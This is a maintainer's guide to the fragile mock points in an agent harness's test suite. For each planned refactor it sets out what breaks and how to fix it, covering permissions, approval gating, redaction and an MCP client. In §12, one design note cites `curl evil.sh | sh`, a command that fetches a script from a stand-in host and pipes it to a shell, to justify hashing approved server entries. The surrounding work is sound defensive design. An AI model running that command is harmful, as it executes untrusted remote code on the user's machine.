# Breaking Changes — Fragile Mock Points in the Test Suite

This file documents why each fragile test in this suite breaks, and what
the fix is expected to be when a planned refactor touches the surface
the test mocks against.

Read this BEFORE updating a failing test that mentions this file in its
docstring. A failure here usually signals a real design change upstream
worth understanding, not a flaky mock to patch over.

---

## 1. `test_orchestrator.py` — the most fragile mock in the suite

This file mocks `RunAgentLoop.stream_deep_research_mode` keyed by `pass_id`
strings ("Pass 0", "Pass 3a", "Final synthesis", ...). The orchestrator
calls `_run_pass(pass_id, ...)`, which since §26 ITERATES
`stream_deep_research_mode(pass_id=pass_id, ...)` rather than calling
`run_deep_research_mode`. Mocks intercept at that boundary, NOT `_run_pass`,
so anything that refactors `_run_pass`'s *internals* doesn't break this test.

**Every patch goes through `tests/conftest.py`'s `pass_stream`**, which wraps
a plain pass-mock into a generator. That indirection is the point: a double
patched on the old name **stops intercepting silently** — `mocker.patch.object`
on a real attribute still succeeds, the real loop runs, reaches a provider,
and the test fails somewhere unrelated. §22's twelve-doubles trap, one layer
down. Repoint `pass_stream` if the boundary moves again; do not open-code a
double at each of the fifteen sites.

This section and `test_orchestrator.py`'s banner both named
`run_deep_research_mode` for two sections after §26 moved it — i.e. the two
documents whose entire job is to keep this mock repointable were handing a
maintainer the name that springs the trap (audit #122).

### What breaks it

| Change | Symptom | Fix |
|---|---|---|
| Rename a pass (e.g. "Pass 3a" → "Grounding") in `orchestrator.py` and `system_prompts.py` | `AssertionError: orchestrator called an unexpected pass_id 'Grounding'` | Update the keys in `_canned_pass_responses` in the test to match the new pass_id strings |
| Change the JSON SHAPE a pass returns — e.g. Pass 2 claims growing a `confidence` field | The orchestrator's `_claim_from_json` filters unknown fields silently (via the `_CLAIM_INPUT_FIELDS` allowlist), so this *doesn't break* the test until a required field is added | If a NEW required field is added to `_CLAIM_INPUT_FIELDS`, include it in the canned Pass 2 mock payloads |
| Widen or narrow `_CLAIM_INPUT_FIELDS` itself | `TestClaimFromJsonFiltersUnknownFields::test_every_allowlisted_field_still_arrives` fails on its exact-contents assertion | Update that assertion, and check the worked example in the row above is still a key the allowlist does **not** contain. This row exists because the previous example was `asserted_by_candidates`, which §10's revisit moved *into* the allowlist — so both this file and `test_orchestrator.py`'s banner spent a section describing filtering with an example that was no longer filtered (issue #123) |
| Add a new pass between existing passes | `AssertionError` on pass-order assertion (the `call_log == expected_order` check) | Add the new pass_id to `_canned_pass_responses` (with its expected JSON shape), insert into the expected pass order list in tests |
| Change the Trace line *format* (e.g. `Pass 0: plan produced (X entities)` → `Pass 0 produced X-entities`) | The `test_pipeline_trace_contains_expected_lines_in_order` test uses `startswith()` against prefix strings like `"Pass 0:"` | Update the `expected_pass_starts` list in that one test to match the new format |
| Refactor `_run_pass` → `_run_pass_with_json_retry` (ROADMAP §3) | Should NOT break this test, since the mock is on `stream_deep_research_mode` not `_run_pass` | If the refactor changes which ENTRYPOINT the orchestrator calls, repoint `conftest.pass_stream` |
| Move the orchestrator's inner call off `stream_deep_research_mode` again | **Nothing raises.** The patch still applies, the interception is lost, and the failure lands somewhere unrelated with a real provider call behind it | Repoint `conftest.pass_stream`'s target. This is the §26 case, and it is why the helper exists rather than fifteen open-coded doubles |
| Add a new kwarg to `RunAgentLoop.stream_deep_research_mode` (e.g. `temperature=None` per ROADMAP §10) | `TypeError: side_effect() got an unexpected keyword argument 'temperature'` | The `_build_pass_mock` side_effect already accepts `**kwargs` to swallow these, so this should NOT break. If it does, re-audit that signature. |

### The expected update pattern after ROADMAP §3 (Malformed-JSON recovery)

ROADMAP §3 refactors `_run_pass` into `_run_pass_with_json_retry` which
keeps appending retry messages to the SAME pass's thread. If the
implementation chooses to keep using `_run_pass` as the inner call
(with retry wrapping it externally), `test_orchestrator.py` is
unaffected — the mock still intercepts `run_deep_research_mode` calls
between `_run_pass` and the SDK. If the implementation instead reaches
into `RunAgentLoop._run()` directly (ROADMAP §3's "alternative"), the
mock target in `_build_pass_mock` needs to switch from
`RunAgentLoop.run_deep_research_mode` to `RunAgentLoop._run`.

### The retry-loop test specifically

`test_pipeline_6a6c_retry_loop_continues_until_max_retries_then_fallback`
hard-codes `MAX_RETRIES = config.MAX_PIPELINE_RETRIES`. If the retry
mechanic goes through ROADMAP §3's JSON-retry (a separate retry cap
inside _run_pass_with_json_retry), the count semantics change: the
orchestrator's outer retry loop still uses `MAX_PIPELINE_RETRIES`, but
inner JSON-retry attempts add extra `run_deep_research_mode` calls per
outer attempt. The test would need to multiply the canned 6a/6c
responses by the new retry factor.

---

## 2. `test_loop_stop_conditions.py` & `test_loop_tool_dispatch.py`

These mock `core.loop.call_model_stream` and `core.loop.registry.dispatch`
directly, both as top-level references inside `core/loop.py`.

**§13 generator conversion:** `_run()` is now a generator yielding
`LoopEvent` objects. Tests wrap it in `run_to_completion()` and mock
`core.loop.call_model_stream` (via `make_stream_from_response` from
`tests/conftest.py`) instead of `core.loop.call_model`. The mock target
changed from `core.loop.call_model` to `core.loop.call_model_stream`.
Any test that still patches `core.loop.call_model` will fail with
`AttributeError: module 'core.loop' has no attribute 'call_model'`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Rename or move `call_model_stream` (e.g. refactor into a different module) | The mock target `core.loop.call_model_stream` no longer exists; tests pass through to real `call_model_stream` and fail (no fake client) | Update the mock target path in both files |
| Add a new parameter to `_run()` (e.g. `tool_context` per ROADMAP §15) | `TypeError: _run() got an unexpected keyword argument` only if tests pass it; tests today use `_build_run_kwargs` / `_make_run_kwargs` so they only pass what's listed | If `_run` grows a required positional parameter (unlikely), update the kwargs builders |
| Change the `stop_reason` strings (e.g. "max_steps_reached" → "MAX_STEPS") | Direct `assert response.stop_reason == "complete"` fails | Update the string literals in the assert statements; these strings are deliberately stable per ARCHITECTURE.md §4.8 so changes here are intentional and warrant a ROADMAP update too |
| Change `_run`'s tool_gate behavior to skip the `error: not available in this context` early branch | `test_disallowed_tool_name_skips_dispatch_and_feeds_error_result` still passes IF the new behavior also avoids dispatching, fails if it dispatches | Audit the new behavior; either update the assertion expectations OR flag the change as a regression of the "tools not allowed in this context" guarantee |
| Remove `run_to_completion()` or change its import path | Tests that call `run_to_completion(RunAgentLoop._run(...))` fail with ImportError | Update the import; `run_to_completion` lives in `core/loop.py` per §13's decision |
| Change `LoopEvent` field names | Tests that inspect events directly (test_streaming_loop.py) fail on attribute access | Update field names in both production and test code |

---

## 3. `test_client_translation.py`

Mock-free pure-translation tests; should be robust.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Add Google's `_tools_for_provider` / `_messages_for_provider` implementation (ROADMAP §9) | `test_tools_google_not_implemented` and `test_messages_google_not_implemented` FAIL because NotImplementedError no longer raises | Delete or rewrite those two tests against the new translation behavior; verify the new behavior matches the SymPy/Content structures Google's SDK expects |
| Change Anthropic's tool_result batching (one user message with N tool_result blocks) — e.g. Anthropic releases a new API version that wants one message per result | `test_messages_anthropic_consecutive_tool_results_batch_into_one_user_message` fails | Update the test to assert the new shape; this is a deliberate API contract change and ARCHITECTURE.md §4.7 should be updated alongside |
| Change OpenAI's `tool_calls.function.arguments` JSON encoding shape | `test_messages_openai_assistant_with_tool_calls_serializes_arguments_as_json` fails | Either the production change is wrong (revert it) or the test expectation is wrong (update it) — verify which by re-reading ARCHITECTURE.md §4.7 load-bearing diffs |

---

## 4. `test_memory_write_through.py`

This file's tests assert the CURRENT (lossy) resume behavior — assistant
entries are persisted as the full rich dict under storage's `content`
column, and `get_session_history` returns them nested under `content`
rather than restored to their original top-level shape.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Re-fix the assistant-shape lossy-resume bug (e.g. make storage.get_session_history reconstruct the poison-neutral shape) | Tests in `test_resume_existing_thread_loads_messages_from_storage` that assert `second.messages[1]["content"]["text"] == "Hi there"` need rewriting to assert `second.messages[1]["text"] == "Hi there"` (top-level keys returned, not nested) | This is a desirable fix. Update those tests to assert the now-uniform shape. The asymmetry note at the top of the file should also be removed/replaced. |
| Reintroduce `from core.storage import ...` in `core/memory.py` | `test_core_memory_import_succeeds` fails with an ImportError mentioning `core.storage` | Revert the import to `from storage import ...` per ARCHITECTURE.md §11 |
| Change `add_assistant_message` to take a different argument (e.g. raw SDK object instead of normalized ModelResponse) — ARCHITECTURE.md §4.6 explicitly forbids this | `test_add_assistant_message_appends_and_save_uses_neutral_shape` fails because it builds a `ModelResponse` to pass in | This is a regression of the §4.6 contract; flag and revert, do NOT update the test to pass SDK objects |

---

## 5. `test_registry_permissions.py`

Mock-friendly: monkeypatches `is_tool_allowed` and `requires_approval`
at the `tools.registry` module namespace. Independent of config defaults.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| `registry.dispatch` adds a new step (e.g. `check_output_policy` from ROADMAP §8) | Tests still pass — they only verify policy enforcement, not the post-call content filter | If you want post-call coverage too, add a new test; don't modify existing ones |
| Add a `core/loop.py` integration that uses a different exception class instead of `ToolCallDenied` | `test_loop_tool_dispatch.py::test_registry_dispatch_raises_ToolCallDenied_caught_and_recorded_as_error` fails | Update the import in that test from `ToolCallDenied` to the new class |
| Change `ToolCallDenied`'s message wording (e.g. "approval" → "consent") | String assertions like `"approval" in result["error"].lower()` may fail | Update the substring checks; keep them loose (lowercase substring) so wording can drift without rewriting tests |

---

## 6. `test_math_tools.py`

Stable across SymPy version drift (uses symbolic equivalence, not string
equality).

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Rename any tool's operations (e.g. "dot_product" → "dot") | Tests pass operation names directly to `run({"operation": "..."})`; will raise a pydantic ValidationError | Update the operation string in the relevant test |
| Change the param model field names (e.g. `vector_a` → `first_vector`) | ValidationError: missing field | Update the param dict in the affected test |
| Make `safe_parse` not raise on injection payloads (e.g. accidentally leave `__builtins__` in the namespace) | `test_safe_parse_blocks_dunder_import_injection` may or may not catch it (depends on whether the payload actually executes) — this is a SECURITY regression. Treat any change to `_SAFE_GLOBALS` in `_math_common.py` as a security-sensitive diff and audit before merging. | Do NOT update the test to "make it pass". The test is correctly asserting a security invariant; the production code must change. |
| Bump SymPy major version | Symbolic equivalence (`sympy.simplify(a - b) == 0`) should hold; minor serialization drift is absorbed by the equivalence check | If a major version introduces a different `Matrix.dot` return type for matrix-vs-vector or changes integer behavior, audit and update expectations |

---

## 7. `test_confidence_scoring.py`

Pure-function tests against `score_claim`. Stable by design; the formula
is manually maintained in `confidence_scoring.py`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Adjust `TIER_THRESHOLDS` (e.g. the LOW cutoff moves from 0.3 to 0.25) | General coverage tests (`test_partial_grounding_factual_lands_medium`, `test_synthesis_above_cap_drops_tier_when_penalized`) may land in different tiers | Update the expected tier in those assertions; the three ROADMAP-required regression tests (HIGH, UNVERIFIED, cap-swallows-penalty) should remain valid REGARDLESS of threshold tuning — if any of those three break, the formula change is a real regression of the regression-guarded invariant |
| Move the cap from `NON_FACTUAL_SCORE_CAP = 0.65` to a different threshold | The cap-before-penalty regression test still passes IF the cap is applied before penalty (the regression test only checks the GAP between clean and flagged claims is exactly `ASSUMPTION_FLAG_PENALTY`, regardless of where the cap sits); the general test `test_synthesis_above_cap_drops_tier_when_penalized` may break depending on new cap value vs flag count arithmetic | Re-audit the general tests against the new cap value; the regression test should keep passing if the formula invariant holds |
| Apply ensemble-mode scoring (ROADMAP §10) — adds a `consistency_score` term and takes `ensemble_n` as a parameter | All five tests still pass: they call `score_claim(claim)` with the default (no ensemble_n), which falls into the unchanged non-ensemble branch | If ensemble-n becomes a required parameter (no default), update tests to pass `ensemble_n=0` explicitly |

---

## 8. `test_pipeline_storage.py` & the §5 persistence schema/status

These tests exercise `core/reasoning/pipeline_storage.py`
(`create_pipeline_run` / `update_pipeline_run` / `load_pipeline_run`)
against the upgraded fake sqlmodel, plus the orchestrator's failure-path
persistence wrap and per-pass checkpointing.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Rename a `PipelineRunRecord` column (`claims_json` / `trace_json` / `coverage_gaps_json` / `final_report`) or change its type | `test_update_pipeline_run_on_complete_marks_complete_and_stores_columns` and `test_load_pipeline_run_round_trips_all_fields` fail with `AttributeError` on the record, or a `json.loads` mismatch | Update the column name/type in both the write and read assertions; keep the separate-columns convention (do NOT collapse back into one blob — see DEVLOG §3.4 for why) |
| Change the `status` literals (`running` / `complete` / `failed`) | `test_..._marks_complete...` and the orchestrator failure/success-path tests fail on the status assertion | Update the literal in both `pipeline_storage.py` (terminal check) and the tests. `complete` is deliberately aligned with `ModelResponse.stop_reason`'s `"complete"` — don't drift it back to `succeeded` |
| Change `update_pipeline_run`'s serialization (e.g. `vars(c)` → `asdict(c)`, or add a field to `Claim`) | The `claims_json` round-trip assertion may change shape | Per the migration note on `Claim` in `base.py`: if a nested-dataclass field is added, migrate EVERY `vars(c)` site (orchestrator passes + `pipeline_storage`) to `asdict(c)` together, then update the test's expected claim dict |
| Change the inner-failure logging in `orchestrator.py`'s except block (the `logger.error(...)` call) | `test_inner_storage_failure_propagates_original_exception_and_logs_run_id` fails — either the original exception is masked (real regression) or the run_id no longer appears in the log message | The invariant: the ORIGINAL pipeline exception must propagate, and the persistence failure must be logged at ERROR naming the `run_id`. Restore both before touching the test |
| Add/remove a `load_pipeline_run` return field | `test_load_pipeline_run_round_trips_all_fields` fails on a missing/extra key | Update the assertion to match the new return shape. The 9-field contract (id, user_query, status, started_at, finished_at, claims, trace, coverage_gaps, final_report) is documented in `pipeline_storage.py`'s docstring |
| Remove or relocate a per-pass `update_pipeline_run(run.run_id, run)` checkpoint in `orchestrator.py` | `test_crash_after_pass_3b_leaves_claims_populated_via_load` or `test_hard_kill_bypasses_except_block_checkpoint_survives` fails — claims or trace are empty/incomplete after a mid-pipeline crash | Restore the checkpoint after the affected `run.log(...)` call. The invariant: every `run.log(...)` (except "Final synthesis complete.", which is subsumed by the terminal update) is followed by a data-only checkpoint. See DEVLOG §5.1 for the full 16-site list |
| Change `test_pipeline_success_marks_run_complete`'s status assertion back to `statuses_seen == ["complete"]` | The test fails because per-pass checkpoints add `None`-status calls before the terminal `"complete"` | The correct assertion: last call is `"complete"`, all preceding are `None`, and at least one `None` exists. See DEVLOG §5.6 |

---

## 9. `test_cli.py` — parser defaults, trust flow, and prompt assembly (§14)

§14 changed `main.py`: `--provider`/`--model` now default to `None` and
resolve AFTER parsing via `resolve_runtime_defaults()` (CLI >
settings.json > config.py), a `--trust-project` flag was added, and
startup runs `_ensure_workspace_trust()` + `config_loader.initialize()`.
System prompts now assemble through
`prompts.system_prompts.with_skill_catalog()` / `pass_prompt()`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Move parser defaults back to argparse-level constants (`default=DEFAULT_PROVIDER`) | `test_build_parser_defaults` fails (asserts `None`) | The `None` defaults are load-bearing: argparse fill-in must be distinguishable from an explicit CLI choice or settings.json can never win. Resolution lives in `resolve_runtime_defaults()` |
| Rename a known settings.json key | `test_resolve_runtime_defaults_precedence` fails | Update the dict keys; the known-key schema lives in `core/config_loader.py::_KNOWN_SETTINGS` and must change in the same commit |
| Change the non-TTY notice wording | `test_trust_non_tty_skips_without_hanging` asserts the notice mentions `--trust-project` | Keep the flag name in the notice (it is the remediation the user needs); the flag itself is user-facing CLI surface and should not be renamed casually |
| Change `describe_project_content()` so settings.json is no longer shown verbatim | `test_trust_prompt_shows_settings_contents` fails | The verbatim display is the informed-consent amendment (DEVLOG §14): a project's settings can pick the provider and multiply pipeline cost, so approval must show them. Restore verbatim display |
| Assert exact system-prompt text passed to `_run()` in any test | Prompt gains an appended `## Available skills` catalog whenever `config_loader` was initialized with skills present | The autouse `clear_config_loader_state` fixture (tests/conftest.py) resets the cache between tests; only `initialize()` with skills inside a test that wants the catalog |
| Move `pass_prompt()`/`with_skill_catalog()` out of `prompts/system_prompts.py` | `test_load_skill.py` prompt-assembly tests fail on import | Keep both there; the §3 JSON-retry path and `run_deep_research_mode` must share one assembly point so the catalog cannot diverge between an attempt and its retry |

---

## 10. Permission signatures, `ToolContext`, and advertised schemas (§15)

§15 added an optional `ToolContext` to every permission entry point and
replaced `_run()`'s `allowed_tools` list with it. Three signatures
changed, and one behavioural default changed with them.

**Signatures:** `is_tool_allowed(name, context=None)`,
`requires_approval(name, params, context=None)`,
`ToolRegistry.approval_needed(name, params, context=None)`,
`ToolRegistry.dispatch(name, params, context=None, approval_callback=None)`,
`ToolRegistry.schemas(context=None)` (was `schemas(tool_names: list[str])`),
`RunAgentLoop._run(..., context, ...)` (was `allowed_tools`).

**Behaviour:** `schemas()` now returns only tools that pass
`is_tool_allowed(name, context)` and any `ToolSpec.available_check`. Under
default config that is **12 of 16** registered tools — `read`/`write`/
`edit`/`shell` are permission `False`. It was 11 until §19: `load_skill`
has an `available_check` that hid it while no skills existed, and §19
shipped four builtins, so it is now advertised for the first time.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Monkeypatch `tools.registry.is_tool_allowed` / `requires_approval` with a lambda taking the OLD arity | `TypeError: <lambda>() takes N positional arguments but N+1 were given` | Add `context=None` to the stub. `mocker.patch(..., return_value=X)` is unaffected — it ignores arity, which is why `test_policy_enforcement.py` survived untouched |
| Define a `fake_dispatch(name, params, approval_callback=None)` test double | `TypeError: got an unexpected keyword argument 'context'` — the loop always passes `context=` | Add `context=None` to the stub signature |
| Assert `dispatch.assert_called_once_with(name, params)` | Fails: actual call is `(name, params, context=None)` | Include `context=None` (or the ToolContext under test) in the expectation |
| Move the approval OR-composition out of `approval_needed()` and back into `dispatch()` | `test_loop_tool_dispatch.py::test_context_is_forwarded_to_dispatch_and_approval_needed` and the AC3 tests still pass, but the loop's permission bridge silently diverges from dispatch | **Do not.** `approval_needed()` is the single source of truth §13 created and §15 extended; the two callers must compute approval from the same code. See DEVLOG §15.3.1 — the ROADMAP sketch gets this wrong because it predates §13 |
| Make a tool's `approval_check` REPLACE `requires_approval()` again instead of OR-ing with it | `test_ac3_context_false_does_not_suppress_tool_approval_check` and `test_approval_check_false_still_consults_config_and_context` fail | This is the specific regression §15 exists to close: an either/or makes agent `approval_overrides` silently inert for `read`/`write`/`edit`/`shell` — the four tools where per-agent tightening matters most |
| Let a context re-enable a globally disabled tool (reorder the AND so the context is checked first, or make `allowed_tools` additive) | `test_ac1_*` fail | The global check is unconditional and first, by design. Agent definitions can come from a merely-trusted project directory; none may hand themselves a capability the user turned off |
| Give `approval_overrides` three-state semantics so `False` can suppress approval | `test_ac3_*` fail | Under OR, `False` is indistinguishable from absent — that asymmetry IS D14. A context may tighten, never loosen |
| Drop `check_output_policy()` from `dispatch()` while refactoring it | `test_ac5_check_output_policy_still_runs_on_dispatched_results` fails | Restore it. §15's own Rev. 2 sketch omitted this line; written as sketched it would have deleted ROADMAP §8's secret redaction in the section about tightening permissions |
| Drop the unknown-tool `ValueError` guard from `dispatch()` | `test_ac7_*` fail with `KeyError` | Restore it. It matters MORE since §15, not less: runtime `unregister()` (D15) makes a stale tool name a reachable state rather than a programmer error |
| Register a tool without adding fields to BOTH `config.ToolPermissions` and `config.ToolApprovals` | `RuntimeError` at `import tools.registry` — the ENTIRE suite fails to collect, not one test | Intended (D24). Add the two boolean fields. `mcp__*` names are exempt |
| Add a tool that should not always be advertised | It appears in every `schemas()` call | Give its `ToolSpec` an `available_check` predicate, as `load_skill` does. Do not special-case it inside `schemas()` — the registry owns mechanism, not policy |
| Flip `read`/`write`/`edit`/`shell` to permission `True` in `config.py` | `test_schemas_omits_globally_denied_tools_from_the_real_registry` fails | Expected — the test pins the shipped default. Update it deliberately, in the same commit as the config change |
| Call `registry.schemas(["a", "b"])` with a name list | `AttributeError` on `.allowed_tools`, or a silently empty result | The list parameter is gone. Pass `ToolContext(allowed_tools={"a", "b"})` — one representation of "which tools may run", not two |

---

## 11. TUI pilot tests, reasoning effort, and the sampling gate (§16)

§16 added `tui/`, an `effort` parameter threaded from the TUI to the provider
payload, and a gate that drops sampling parameters on models that reject
them. Three new test files: `test_tui.py`, `test_client_effort.py`,
`test_ensemble_guard.py`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Revert `run_worker(..., exit_on_error=False)` to Textual's default | `test_ac3_exception_in_a_tool_does_not_terminate_the_app` fails, and it fails by tearing down the whole test app — the output is a full Textual crash dump, not an assertion | Restore it. The default kills the app on any transient worker exception. `on_worker_state_changed` is required alongside it or the error is reported nowhere |
| Make a permission dismissal path not put a boolean on the channel (return early, dismiss with `None`, drop the `put`) | The AC2 tests **stall** rather than fail — the worker parks on `queue.get(timeout=ATTENDED_APPROVAL_TIMEOUT_S)`. Since TECHNICAL_DEBT 8 an autouse fixture shrinks that under test, so it now stalls for seconds and then fails, instead of stalling for ten minutes | Every dismissal path, including Escape, must resolve to a boolean. This is why the AC2 tests assert on the dispatched tool: a modal that renders and drops the answer looks identical to one that works, right up until it doesn't |
| Delete the quiescing `await pilot.pause()` from `settle` | `test_pilot_wait.py::TestTheQuiesce` — two tests, on the pause count. **Not** any TUI test: 43/43 stay green under 4× CPU load, because the bare `pause()` used for polling masks the need. That masking is what made this take two attempts to find | Restore it. It and the bare `pause()` are two independent defences against one deadlock (a modal predicate goes true before the worker reaches `channel.get()`), and the pairing that actually fails is fast polling *without* it — measured 3/3 on the quitting test |
| Swap `settle`'s wall-clock deadline back for `for _ in range(120)` | `test_it_outlasts_the_old_pump_budget` and `test_a_never_true_predicate_gives_up_after_the_timeout` | A pump count is not a wait: `pilot.pause()` is 21ms with nothing burning CPU in-process and 1021ms with one busy sibling thread, so 120 pumps was worth 2.5s–122s. Re-run that mutation on an **idle** machine — under load the old helper is over-patient and passes too |
| Give `pump` a deadline, or route a negative assertion through `settle` | `TestPump` — two tests, one of them on runtime. Suite time also regresses by ~20s | `pump` backs "prove X did *not* happen", where there is no predicate to wait for; a deadline makes every such site pay its full timeout for nothing |
| Drop the `shrink_approval_timeout` autouse fixture | `test_the_approval_timeout_is_shrunk_for_tests`, and nothing else — by nature it changes no outcome, only how long a broken modal path takes to reach one | Keep it. It is asserted directly precisely because no other test can notice it going |
| Restart or re-enter the generator on approval instead of resuming it | `test_ac2_approving_...` fails on the dispatch assertion — a fresh generator re-issues the model call and never reaches the tool | Resume. `permission_channel` exists (§13) so the SAME generator continues |
| Add `asyncio_mode = auto` to `pytest.ini` | Nothing breaks immediately, but ARCHITECTURE §4.13's "no asyncio in pytest.ini" stops being true | Not needed — TUI tests carry explicit `@pytest.mark.asyncio`. `--strict-markers` accepts it because pytest-asyncio registers the marker |
| Change `call_model_stream`'s positional parameter order | `test_effort_reaches_the_model_call` asserts `call_args[0][7] == "high"` | Update the index, or switch the assertion to a keyword — but keep asserting on the *call arguments*, not on the raven: the indicator can be right while the parameter never leaves the UI |
| Make `effort=None` send something on any provider | `test_no_effort_sends_nothing_on_every_provider` fails | Silence is the only universally safe value: `reasoning_effort` is rejected by OpenAI-compatible non-reasoning models, adaptive thinking by pre-4.6 Anthropic models. Opt-in is what keeps §16 from changing every existing caller's behaviour |
| Tabulate Anthropic effort levels instead of querying | `test_anthropic_levels_come_from_the_api_not_a_table` fails (it uses a model name absent from every table) | Query. The entire point is that a newly released Anthropic model needs no entry in this repo |
| Query a non-Anthropic provider for capabilities | `test_non_anthropic_uses_the_table_without_querying` fails the client stub deliberately | No OpenAI-compatible provider in `providers.json` exposes a capability endpoint |
| Send `ThinkingConfig(thinking_budget=...)` unconditionally on Google | `test_google_effort_tracks_what_the_installed_sdk_can_express` fails; against the real pinned SDK it is a `TypeError` | The pinned `google-genai==1.0.0` has no such field. Keep the `_google_supports_thinking_budget()` gate, or move the pin deliberately — which also puts §9's Google implementation back in scope for retest |
| Drop the sampling parameter silently instead of logging | `test_sampling_dropped_for_models_that_reject_it` fails on the caplog assertion | Warn. A silent drop is how ensemble mode came to look like it worked |
| Make the roster guard warn-and-continue instead of raising | `test_the_refusal_lands_before_any_work` fails | Raise. Continuing produces N near-identical candidates and reports maximal cross-candidate consistency for all of them — an expensive wrong answer, not a degraded one. §16's row here named the *sampling* guard, which §10's revisit replaced; the reason carried over, the mechanism did not |
| Change `config.MODEL_NAME` to a model that accepts sampling params | `test_default_model_is_in_the_reject_set` fails | Intended as a deliberate signal: update the test in the same commit, having checked the new default really does accept them |
| Change `config.MAX_TOKENS` | Nothing fails — `test_call_model_google_text_only` asserts against the setting, not a literal | That test used to hardcode 4096 and broke when §16 raised it. Assert against the setting for tunables |
| Add a settings key without adding it to `_KNOWN_SETTINGS`/`_KNOWN_TUI` | `ValueError: unknown tui key` at load | Intended (§14 amendment 1). A preference the loader doesn't know about is a startup error, not a silently ignored line |
| Add a nested settings section without adding it to `_NESTED_SETTINGS` | It validates as a bare `dict` and **shallow-merges** across tiers — a project setting silently discards the user's sibling keys | Register it in `_NESTED_SETTINGS`; both the validator and the deep-merge iterate it. Hardcoding the section name in two places is what produced review finding F2 |
| Remove `ThinkingConfig` from the Google fake in root `conftest.py` | Every Google effort test errors on a missing attribute | The real SDK has it. A fake missing what production provides is the double drifting, not the code being wrong |

---

## 12. MCP client, the async bridge, and tier precedence (§17)

§17 added `mcp_client/`, made redaction recursive, flipped user/project tier precedence, and made
MCP tools approval-gated by default. Two new test files: `test_mcp_client.py`,
`test_mcp_config.py`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Collapse the `_manager()` task back into `connect_all()` entering the stack and `disconnect_all()` closing it (what §17's spec sketches) | `test_disconnect_all_unwinds_without_a_cancel_scope_error` fails with `RuntimeError: Attempted to exit cancel scope in a different task than it was entered in` in the log | Restore the manager task. anyio binds cancel scopes to the TASK, and `run_coroutine_threadsafe()` creates a new one per call — being on the right *loop* is not enough. Note the test asserts on the **log**, not on `raises`: `disconnect_all()` swallows exceptions, so a "does not raise" assertion here is unfalsifiable |
| Drop `read_timeout_seconds` and rely on `future.result(timeout=)` alone | `test_ac4_a_hanging_tool_times_out_via_the_protocol_not_the_caller` fails on elapsed time | Keep both. The protocol timeout cancels the request; the future timeout only stops waiting. Assert on **which one fired**, not on "an error came back" — both paths return an error, which is what made the first version of this test vacuous |
| Rename a package to `mcp/` | Everything fails at import: `import mcp` resolves to the local package | It must stay `mcp_client/`. The project root is on `sys.path` |
| Read `.structuredContent` / `.isError` (v1 spellings) | `test_normalize_reads_v2_snake_case_field_names` fails | v2 is snake_case. Reading v1 names against v2 doesn't crash — `getattr` returns `None`, so **every failed call silently looks successful**, the worst available shape |
| Move the `mcp` pin below 2.0 | Import errors (`MCPError`, `Client`) plus silent field mismatches | Re-verify in hand before moving it, per D22. That instruction is why §17 shipped against v2 instead of a spec written for v1 |
| Revert `_redact_value` to top-level strings only | 2 tests in `test_policy_enforcement.py` and `test_ac6_secret_in_mcp_output_is_redacted_by_the_existing_layer` fail | Keep the recursion. `structured_content` is arbitrary third-party JSON arriving under `result` as a dict; scanning only top-level strings leaves the highest-risk output unscanned |
| Restore `_tier_dirs` to `[harness, project, user]` | `test_user_wins_over_project` and `test_f3_user_over_project_collision_warns` fail | D29 inverted it deliberately. Harness stays first (D18) |
| Implement D29 as "only the user tier loads" | `test_non_colliding_definitions_from_both_tiers_all_load` fails | Precedence breaks same-name ties only; `_discover()` accumulates a union |
| Express `autoApprove` as a `ToolSpec.approval_check` instead of a base default | `test_d28_auto_approve_server_does_not_require_approval` fails | `approval_needed()` ORs approval_check in, and OR can only tighten — an opt-out there is inert. Vary the base default via `set_dynamic_approval_default` |
| Make `_default_for_unknown_approval` return False for `mcp__*` | `test_d28_mcp_tools_require_approval_by_default` fails | Allowed-by-default and trusted-by-default are different questions |
| Add a try/except-free `_connect_all_async` | `test_a_failing_server_is_named_and_skipped_without_stopping_the_others` fails | One stale entry must not make the harness unusable |
| Move project `mcp.json` back to the project root | `test_project_mcp_json_lives_under_dot_venastine` fails | At the root it sits outside D17's hash, and `is_trusted()` returns True when `.venastine/` is absent |
| Key the acknowledgement store by name only | `test_editing_the_command_makes_a_remembered_server_unknown_again` fails | Hash the entry. Otherwise approving `npx pkg` silently carries to `curl evil.sh \| sh` under the same name |
| Stub `mcp` in the root `conftest.py` like the other six SDKs | The bridge tests stop testing the bridge | Deliberate exception. v2's in-memory transport is offline already, and a fake cannot reproduce anyio's cancel scopes — the bug that shaped this design |

---

## 13. Agent system: dispatch injection, headless callability, goal mode (§18)

§18 added `parent_run` to `dispatch()`, signature-inspection injection of
`parent_context`/`parent_run` into handlers that declare them, the
headless callability filter (`schemas(callable_only=...)` +
`headless_hidden()`), `ConversationMemory.extra`/`set_extra`, and the
`system_prompt=` kwarg on `run_agent_conversation`.

### What breaks these

| Change | Symptom | Fix |
|---|---|---|
| Define a `fake_dispatch(name, params, context=None, approval_callback=None)` test double | `TypeError: got an unexpected keyword argument 'parent_run'` / `'permission_channel'` — the loop always passes both now | Add `parent_run=None, permission_channel=None` to the stub signature |
| Assert `dispatch.assert_called_once_with(name, params, context=X)` | Fails: actual call also carries `parent_run=RunInfo(...)` and `permission_channel=` | Add `parent_run=ANY, permission_channel=None` to the expectation |
| Assert `approval_needed` was called exactly once per tool call | Fails: §18's headless filter consults it at schema time too | Assert every call received the same context (`call_args_list`), not a count — see `test_context_is_forwarded_to_dispatch_and_approval_needed` |
| Spy/fake `ConversationMemory` lacking `.extra` | `AttributeError: ... no attribute 'extra'` from `with_goal()` | Add `self.extra = {}` to the double (and `set_extra` if it is exercised) |
| `FakeStorage.get_thread` returning a bare truthy sentinel | NOT an `AttributeError`: `ConversationMemory.__init__` reads `extra_data` defensively via `getattr`, so the thread silently gets an empty `.extra` and the failure surfaces LATER as a missing `## Persistent objective` section | Return an object carrying `extra_data` (the fake now mirrors the real row); keep `None` for unknown ids |
